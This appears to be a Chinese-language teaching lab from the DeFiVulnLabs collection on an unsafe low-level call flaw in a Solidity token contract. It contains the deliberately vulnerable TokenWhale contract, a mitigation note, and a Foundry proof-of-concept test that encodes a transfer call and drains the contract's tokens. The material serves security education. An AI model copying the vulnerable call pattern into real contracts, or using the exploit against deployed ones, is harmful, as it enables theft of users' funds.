# 未经检查的外部调用——调用注入  
[UnsafeCall.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/UnsafeCall.sol)  

**名称：**  不安全的调用漏洞  
**描述：**  
在TokenWhale合约的approveAndCallcode函数中，存在一个漏洞允许执行带有任意数据的任意调用，从而导致潜在的安全风险和意外后果。  
该函数使用低级别的调用（_spender.call(_extraData)）来执行_spender地址的代码，而没有对提供的_extraData进行任何验证或检查。  
这可能导致意外行为、重入攻击或未经授权的操作。

本练习涉及到对合约进行低级别调用，其中输入和返回值未经检查。  
如果调用数据可控，就很容易引发任意函数执行 



**缓解措施：**   
尽量避免使用低级别的“call”。  

**参考**  
https://blog.li.fi/20th-march-the-exploit-e9e1c5c03eb9  


**TokenWhale 合约：**  
```
contract TokenWhale {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function TokenWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000; // 1 百万
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }

    /* 授权然后调用合约代码*/
    function approveAndCallcode(
        address _spender,
        uint256 _value,
        bytes memory _extraData
    ) public {
        allowance[msg.sender][_spender] = _value;

        bool success;
        //容易受到攻击的调用执行不安全的用户代码 
        (success, ) = _spender.call(_extraData);
        console.log("success:", success);
    }
}
```  


**如何测试：**  
forge test --contracts src/test/UnsafeCall.sol-vvvv  
```
// 测试不安全调用的函数
function testUnsafeCall() public {
    // 设置环境变量
    address alice = vm.addr(1);
    TokenWhaleContract = new TokenWhale();
    TokenWhaleContract.TokenWhaleDeploy(address(TokenWhaleContract));

    console.log(
        "TokenWhale balance:",
        TokenWhaleContract.balanceOf(address(TokenWhaleContract))
    );

    // Alice试图执行不安全的调用以从TokenWhaleContract转移资产
    console.log(
        "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
    );

    // 将msg.sender更改为Alice地址
    vm.prank(alice);

    // Alice调用了approveAndCallcode函数，并传递了一个经过编码的数据，
    // 这个数据表示了对transfer函数的调用。
    TokenWhaleContract.approveAndCallcode(
        address(TokenWhaleContract),
        0x1337, // 不影响漏洞利用
        abi.encodeWithSignature(
            "transfer(address,uint256)",
            address(alice),
            1000
        )
    );

    // 检查漏洞利用是否成功
    assertEq(TokenWhaleContract.balanceOf(address(alice)), 1000);
    console.log("Exploit completed");

    // 记录最终余额
    console.log(
        "TokenWhale balance:",
        TokenWhaleContract.balanceOf(address(TokenWhaleContract))
    );
    console.log(
        "Alice balance:",
        TokenWhaleContract.balanceOf(address(alice))
    );
}

// 接收以太币的回退函数
receive() external payable {}
```  
**红色框：** 成功利用漏洞，成功掏空了TokenWhale合约。  
![image](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fef522203-1293-43f6-bf50-746d2a4b8457%2FUntitled.png?table=block&id=442bc8fe-4714-4112-a892-725b88a7b32e&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)
